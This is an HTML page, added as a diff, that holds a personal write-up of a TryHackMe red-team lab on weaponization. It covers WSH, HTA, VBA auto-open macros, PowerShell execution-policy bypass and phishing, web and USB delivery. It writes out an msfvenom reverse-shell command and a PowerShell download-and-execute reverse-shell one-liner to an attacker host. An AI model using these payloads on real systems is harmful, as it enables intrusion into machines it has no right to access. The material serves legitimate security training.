@@ -1,0 +1,327 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<meta
+			name="description"
+			content="HEXEN - Penetration Tester & Penetration Tester Portfolio"
+		/>
+		<title>HEXEN // CYBERPUNK PEN-TESTER PORTFOLIO</title>
+		<link rel="stylesheet" href="../assets/css/writeups.css" />
+	</head>
+
+	<body class="cyberpunk-body">
+		<!-- Matrix Rain Background -->
+		<div id="matrix-rain" class="matrix-rain"></div>
+
+		<!-- Grid Background -->
+		<div class="grid-bg fixed top-0 left-0 w-full h-full z-0"></div>
+
+		<!-- Scanlines -->
+		<div
+			class="scanlines fixed top-0 left-0 w-full h-full pointer-events-none z-0"
+		></div>
+
+		<!-- Navigation -->
+		<nav
+			class="cyber-nav fixed top-0 left-0 w-full z-50 bg-black bg-opacity-80 backdrop-blur-sm border-b border-neongreen"
+		>
+			<div class="container mx-auto px-4 py-3">
+				<div class="flex justify-between items-center">
+					<div class="cyber-logo">
+						<span
+							class="text-neongreen font-bold text-xl glitch-effect"
+							data-text="HEXEN"
+							>HEXEN</span
+						>
+						<span class="text-neonpink text-sm ml-2"
+							>// SECURITY_SPECIALIST</span
+						>
+					</div>
+
+					<!-- Desktop Menu -->
+					<div class="hidden md:flex space-x-6">
+						<a href="../" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+
+					<!-- Mobile Menu Button -->
+					<div class="md:hidden mt-4">
+						<button
+							id="mobile-menu-button"
+							type="button"
+							class="text-neongreen focus:outline-none"
+						>
+							<svg
+								class="h-6 w-6 transition-transform duration-300"
+								id="menu-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M4 6h16M4 12h16M4 18h16"
+								></path>
+							</svg>
+							<svg
+								class="h-6 w-6 transition-transform duration-300 hidden"
+								id="close-icon"
+								fill="none"
+								viewBox="0 0 24 24"
+								stroke="currentColor"
+							>
+								<path
+									stroke-linecap="round"
+									stroke-linejoin="round"
+									stroke-width="2"
+									d="M6 18L18 6M6 6l12 12"
+								></path>
+							</svg>
+						</button>
+					</div>
+				</div>
+
+				<!-- Mobile Menu (hidden by default) -->
+				<div
+					id="mobile-menu"
+					class="md:hidden mt-2 border-t border-neongreen border-opacity-30 transform origin-top transition-all duration-300 scale-y-0 opacity-0 max-h-0"
+				>
+					<div class="flex flex-col space-y-4">
+						<a href="../index.html" class="nav-link">HOME</a>
+						<a href="../about.html" class="nav-link">ABOUT</a>
+						<a href="../writeups.html" class="nav-link">WRITEUPS</a>
+						<a href="../blogs.html" class="nav-link">BLOGS</a>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<main class="relative z-10 pt-20">
+			<section id="writeup-controls" class="px-6 pt-6 pb-2 text-center">
+  
+
+  <div id='tags-container'>
+    
+  </div>
+</section>
+
+
+<div class="series-nav">
+  <div class="series-nav-header">
+    <span class="series-label">TryHackMe Red Team Path</span>
+    <span class="series-module">Module: Initial Access</span>
+    <span class="series-part">Part 6 / 18</span>
+  </div>
+  <div class="series-nav-dots"><span class="series-dot" title="Red Team Fundamentals (4 parts)"></span><span class="series-dot active-module" title="Initial Access (4 parts)"></span><span class="series-dot" title="Post Compromise (3 parts)"></span><span class="series-dot" title="Host Evasions (7 parts)"></span></div>
+  <div class="series-nav-links">
+    <a href="red_team_recon_writeup.html" class="series-nav-btn cyber-link">← red team recon</a>
+    <a href="../writeups.html" class="series-nav-btn cyber-link">↑ all writeups</a>
+    <a href="password_attacks_writeup.html" class="series-nav-btn cyber-link">password attacks →</a>
+  </div>
+</div>
+<!-- Writeup content -->
+<article class="markdown-body"><h1>Weaponization</h1>
+<p><strong>Introduction</strong></p>
+<p>** **In the Cyber Kill Chain model, <strong>Weaponization</strong> is the second stage. In this stage, the attacker <strong>generates and develops their own malicious code</strong> using <strong>deliverable payloads</strong> such as **word documents, PDFs etc.**The weaponization stage aims to use the malicious weapon to exploit the target machine and gain initial access.</p>
+<p>Most organisations have Windows OS running, which is going to be a likely target.
+An organisation’s environmental policy often blocks downloading and executing <strong>.exe</strong> files to avoid security violations. Therefore, red teamers rely upon building custom payloads sent via various channels such as phishing campaigns, social engineering, browser or software exploitation, USB or web methods.</p>
+<p>The following graph is an example of weaponization, where a crafted custom PDF or Microsoft Office document is used to deliver a malicious payload. The custom payload is configured to connect back to the C2 environment of the red team infrastructure.</p>
+<p>For more information about red team toolkits, please visit the following: a GitHub repository that has it all, including initial access, payload development, delivery methods, and others.</p>
+<p>Most organizations block or monitor the execution of .exe files within their controlled environment. For that reason, red teamers rely on executing payloads using other techniques, such as built-in windows scripting technologies. Therefore, this task focuses on various popular and effective scripting techniques, including:</p>
+<p><strong>The Windows Script Host (WSH)</strong>
+<strong>An HTML Application (HTA)</strong>
+<strong>Visual Basic Applications (VBA)</strong>
+<strong>PowerShell (PSH)</strong></p>
+<p><strong>Windows Scripting Host - WSH</strong></p>
+<p>Windows scripting host has a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.</p>
+<p>It is a Windows native engine, <strong>cscript.exe</strong> (for command-line scripts) and <strong>wscript.exe</strong> (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including **vbs **and <strong>vbe</strong>. For more information about VBScript, check this out: <a href="https://en.wikipedia.org/wiki/VBScript">https://en.wikipedia.org/wiki/VBScript</a></p>
+<p>It is important to not that the VBScript engine on a Windows operating system runs and executes applications with the same level of access and permission as a regular user; therefore, it is useful for red teamers.</p>
+<p>Now, let’s write a simple VBScript code to create a message box that shows the “Welcome to THM” file. Make sure to save the following code into a file, for example, “hello.vbs”.</p>
+<p>Dim message
+message = &quot;Welcome to THM&quot;
+MsgBox message</p>
+<p>So, in the first line, we declared the <strong>message</strong> variable using <strong>Dim</strong>. Then we store a string value of **Welcome to THM **in the <strong>message</strong> variable. In the next line, we use the MsgBox function to show the content of the variable. For more information about the MsgBox function, please visit here: <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/sfw6660x(v=vs.84)?redirectedfrom=MSDN</a></p>
+<p>Then, we use <strong>wscript</strong> to run and execute the content of <strong>hello.vbs</strong>. As a result, a Windows message will pop up with the** Welcome to THM** message.</p>
+<p>Now let’s use the VBScript to run executable files. The following <strong>vbs</strong> code is to invoke the Windows calculator, proof that we can execute <strong>.exe</strong> files using the Windows native engine (WSH).</p>
+<p>Set shell = WScript.CreateObject(&quot;Wscript.Shell&quot;)
+shell.Run(&quot;C:\Windows\System32\calc.exe &quot; &amp; WScript.ScriptFullName),0,True</p>
+<p>We create an object of the **WScript **library using <strong>CreateObject</strong> to call the execution payload. Then, we utilize the <strong>Run</strong> method to execute the payload. For this task, we will run the Windows calculator <strong>calc.exe</strong></p>
+<p>To execute the <strong>vbs</strong> file, we can run it using the <strong>wscript</strong> as follows:<strong>wscript &lt;filename.vbs&gt;</strong></p>
+<p>Here is another trick:If VBS files are blacklisted, then we can rename the file to **.txt **and run it using <strong>wscript</strong> as follows:
+wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</p>
+<p><strong>An HTML Application (HTA)</strong>
+HTA stands for “HTML Application”. It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered.
+<strong>HTML Applications</strong> are also known as HTAs,which are dynamic **HTML **pages containing JScript and VBScript.
+HTML Application (HTA) files are files that contain HTML, JScript, and or VBScript code that can be executed on client system. This can to lead to more dynamic applications or remote code execution on a client or victim.
+The LOLBINS (Living-Off-The-Land Binaries) tool <strong>mshta</strong> is used to execute **HTA **files. It can be executed by itself or automatically from Internet Explorer.</p>
+<p>In the following example, we will use an <strong>ActiveXObject</strong> in our payload as proof of concept to execute <strong>cmd.exe</strong>. Consider the following HTML code:</p>
+<p>Then serve the <strong>payload.hta</strong> from a web server.
+This can be done from the attacker machine as follows:</p>
+<p>On the victim machine, visit the malicious link using Edge, at /payload.hta
+(<attackbox ip>:8090/payload.hta)</p>
+<p>So once we run the file and the payload gets executed, it will invoke <strong>cmd.exe</strong>
+The figure above shows that we have successfully executed the <strong>cmd.exe</strong></p>
+<p><strong>HTA Reverse Connection</strong>
+We can create a reverse shell payload as follows:
+<strong>Msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f hta-psh -o thm.hta</strong></p>
+<p>We use <strong>msfvenom</strong> from the Metasploit framework to generate a malicious payload to connect back to the attacking machine. We used the following payload to connect the <strong>windows/x64/shell_reverse_tcp</strong> to our IP and listening port.</p>
+<p>On the attacking machine, we need to listen to the port <strong>443</strong> using <strong>nc.</strong> This port needs root privileges to open.</p>
+<p>Once the victim visits the malicious URL (<strong>in my example: 192.168.0.115:443/htm.hta)</strong>,and hits run, we get the connection back:</p>
+<p><strong>Malicious HTA via Metasploit</strong>
+There is another way to generate and serve malicious HTA files using the Metasploit framework.
+First, run the Metasploit framework using **msfconsole -q **command. Under the exploit section, there is <strong>exploit/windows/misc/hta_server</strong>, which requires selecting and setting information such as <strong>LHOST</strong>, <strong>LPORT</strong>, <strong>SRVHOST</strong>, <strong>Payload</strong>, and finally executing <strong>exploit</strong> to run the module.</p>
+<p><strong>Visual Basic for Application (VBA)</strong>
+VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, Powerpoint, etc.</p>
+<p>VBA Programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications.</p>
+<p>Macros are MS Office Applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes.</p>
+<p>One of VBA’s features is accessing the Windows Application Programming Interface (API) and other low-level functionality.</p>
+<p>For more information about VBA, visit here:<a href="https://en.wikipedia.org/wiki/Visual_Basic_for_Applications">https://en.wikipedia.org/wiki/Visual_Basic_for_Applications</a></p>
+<p>We will discuss the basics of VBA and ways that adversaries use macros to create malicious Microsoft documents.</p>
+<p>Firstly, we open Microsoft Word.
+We create a blank microsoft document to make our first <strong>macro</strong>.
+We first need to open the Visual Basic Editor by selecting <strong>view</strong> -&gt; <strong>macros</strong>.
+The Macros window shows how to create our own macro within the document.</p>
+<p>Sub THM()
+MsgBox (&quot;Welcome to Weaponization Room!&quot;)
+End Sub</p>
+<p>Now, in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as <strong>AutoOpen</strong> and <strong>Document_open</strong>. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the **THM **function.</p>
+<p>Sub Document_Open()
+THM
+End Sub</p>
+<p>Sub AutoOpen()
+THM
+End Sub</p>
+<p>Sub THM()
+MsgBox (&quot;Welcome to Weaponization Room!&quot;)
+End Sub</p>
+<p>It is important to note that for this macro to work, we will need to save it in a Macro-Enabled Format such as .doc or .docm
+Now let’s save the file as <strong>Word 97-2003 Template</strong> where the macro is enabled.</p>
+<p>After reopening our word document, Word will warn us that macros are disabled. We need to enable them. After doing so, it gets automatically executed.</p>
+<p>Now, we can edit the word document and create a macro function that executes something like calc.exe or any executable file as proof of concept, as follows:Sub PoC()
+Dim payload As String
+payload = &quot;calc.exe&quot;
+CreateObject(&quot;Wscript.Shell&quot;).Run payload,0
+End Sub</p>
+<p>To explain the code in detail, with **Dim payload As String **we declare <strong>payload</strong> variable as a string using **Dim **keyword.</p>
+<p>With <strong>payload = “calc.exe”</strong> we are specifying the payload name and finally with <strong>CreateObject(“WScript.Shell”).Run payload</strong> we create a Windows Scripting Host (WSH) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the <strong>AutoOpen()</strong> and <strong>Document_open()</strong> functions too.</p>
+<p>Make sure to test your code before saving the document by using the running feature in the editor.
+Make sure to create <strong>AutoOpen()</strong> and <strong>Document_open()</strong> functions before saving the document.
+Once the code works, save the file and try to open it again.</p>
+<p>It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.</p>
+<p><strong>Powershell - PSH</strong>
+<strong>PowerShell</strong> is an object-oriented programming language executed from the Dynamic Language Runtime <strong>(DLR)</strong> in <strong>.NET</strong> with some exceptions for legacy uses. Check out the TryHackMe room:
+<a href="https://tryhackme.com/room/powershell">https://tryhackme.com/room/powershell</a></p>
+<p>Red Teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let’s start by creating a straightforward PowerShell script that prints “Welcome to the Weaponization room!” as follows:
+Write-Output &quot;Welcome to the Weaponization Room!&quot;</p>
+<p>Save this file as <strong>thm.ps1</strong></p>
+<p>With the <strong>Write-Output</strong>, we print the message **“Welcome to the Weaponization Room!” **to the command prompt. Now let’s run it and see the result.</p>
+<p><strong>Execution Policy</strong></p>
+<p>PowerShell’s execution policy is a security option to protect the system from running malicious scripts. By default, microsoft disables executing PowerShell scripts (<strong>.ps1)</strong> for security purposes.
+The PowerShell execution policy is set to <strong>Restricted</strong> which means that it permits individual commands to be run but not any scripts.</p>
+<p>We can determine the <strong>current PowerShell setting</strong> of Windows as follows:</p>
+<p><strong>Get-ExecutionPolicy</strong>
+“Restricted”</p>
+<p>We can also easily change the PowerShell execution policy by running:
+** Set-ExecutionPolicy -Scope CurrentUser RemoteSigned **</p>
+<p><strong>Bypass Execution Policy</strong>
+Microsoft provides ways to disable this restruction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to <strong>bypass</strong> policy which means nothing is blocked or restricted</p>
+<p>This is useful since that lets us run our own PowerShell scripts.</p>
+<p>In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows:<strong>powershell -ex bypass -File thm.ps1</strong></p>
+<p>We will now try getting a reverse shell using one of the tools written in PowerShell, which is <strong>powercat</strong>.
+Then we need to set up a web server on the attacker machine to serve that powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. We will use 8080 this time.
+<strong>cd powercat</strong>
+<strong>python3 -m http.server 8080</strong></p>
+<p>Now, listen on port <strong>1337</strong> using **nc **to receive the connection back from the victim.
+<strong>nc -lvp 1337</strong></p>
+<p>Now, from the victim machine, we download the payload and execute it using Powershell payloads as follows:</p>
+<p><strong>powershell -c “IEX(New-Object <strong><strong>System.Net</strong></strong>.WebClient).DownloadString(‘<ip>:8080/powercat.ps1’);powercat -c <ip> -p 1337 -e cmd”</strong></p>
+<p>Now that we have executed the command above, the victim machine downloads the <strong>powercat.ps1</strong> payload from our web server then executes it locally on the target using <strong>cmd.exe</strong> and sends a connection back to the AttackBox that is listening on port <strong>1337</strong>.
+After a couple of seconds, we should receive a connection callback.</p>
+<p><strong>Command and Control (C2)</strong>
+We already did this one before</p>
+<p><strong>Delivery Techniques</strong>
+Delivery techniques are one of the most important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.</p>
+<p><strong>Email Delivery</strong>
+This is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more information, look here: <a href="https://attack.mitre.org/techniques/T1566/001/">https://attack.mitre.org/techniques/T1566/001/</a></p>
+<p>This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim’s network or host.</p>
+<p>The red teamers should have their own infrastructure for phishing purposes.
+Depending on the red team engagement requirement, it requires setting up various records within the email server, including DomainKeys Identified Mail (<strong>DKIM</strong>), Sender Policy Framework <strong>(SPF)</strong> and DNS Pointer <strong>(PTR)</strong> record.</p>
+<p>The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo and others with good reputation.</p>
+<p><strong>Web Delivery</strong>
+Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit here:<a href="https://attack.mitre.org/techniques/T1189/">https://attack.mitre.org/techniques/T1189/</a></p>
+<p>This method includes other techniques such as social engineering the victim to visit the malicious file. A URL shortener could be helpful when using this method.</p>
+<p>In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine</p>
+<p><strong>USB Delivery</strong>
+This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, look here: <a href="https://attack.mitre.org/techniques/T1091/">https://attack.mitre.org/techniques/T1091/</a></p>
+<p>Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations do indeed allow it in the target environment.</p>
+<p>Common USB attacks used to weaponize USB devices include <strong>Rubber Ducky</strong> and <strong>USBHarpoon</strong>, charging USB cable, such as <strong>O.MG</strong> <strong>Cable.</strong></p>
+<p>Practice Arena (Writeup)</p>
+<p>Back from the section which explained how to create a malicious HTA with Metasploit, i went into the msf console and ran “use exploit/windows/misc_hta_server”
+I then set the LHOST, LPORt and SRVHOST accordingly. Then i ran “set payload windows/meterpreter/reverse_tcp” and then “exploit”.</p>
+<p>This created a reverse TCP handler at the attackbox IP on port 8080, with a hta file at the end of the link.
+Inserting this link into the link slot in the page creates a reverse shell which we can access.</p>
+<p>Taking a look at “sessions”, we will notice our session active on slot 1.
+Interacting with it by “sessions -i 1” will allow us to access a meterpreter shell for command execution. From there, we just need to perform file navigation all the way to /Users/thm/Desktop/flag.txt</p>
+<p>The commands went like this:<strong>ls</strong>
+<strong>cd ..</strong>
+<strong>ls</strong></p>
+<p>Then:
+<strong>cd Users</strong>
+<strong>ls</strong></p>
+<p><strong>then , cd thm</strong>
+<strong>Then cd Desktop</strong></p>
+<p><strong>And the flag:</strong></p>
+<p><strong>Also:</strong>   A very useful MSFVenom cheat sheet <a href="https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/">https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/</a></p>
+</article>
+${series_nav}
+
+			<!-- Footer -->
+			<footer
+				class="cyber-footer py-12 bg-black border-t border-gray-800 mt-12"
+			>
+				<div class="container mx-auto px-4">
+					<div class="flex flex-col md:flex-row justify-between items-center">
+						<div class="mb-6 md:mb-0">
+							<h3 class="text-2xl font-bold mb-2 text-neongreen">HEXEN_SEC</h3>
+							<p class="text-sm text-gray-400 cyber-text">
+								Penetration Testing & Security Consulting
+							</p>
+						</div>
+						<div class="flex space-x-6">
+							<a
+								href="#"
+								class="hover:text-neongreen transition-colors cyber-link"
+								>Imprint</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonpink transition-colors cyber-link"
+								>Privacy</a
+							>
+							<a
+								href="#"
+								class="hover:text-neonblue transition-colors cyber-link"
+								>Legal</a
+							>
+						</div>
+					</div>
+					<div
+						class="border-t border-gray-800 mt-8 pt-8 text-center text-sm text-gray-400"
+					>
+						<p class="cyber-text">
+							© 2025 HEXEN. All systems operational.
+							<span class="text-neongreen">//</span> Secure by design.
+						</p>
+					</div>
+				</div>
+			</footer>
+		</main>
+		<script type="module" src="../assets/js/menu.js" defer></script>
+	</body>
+</html>
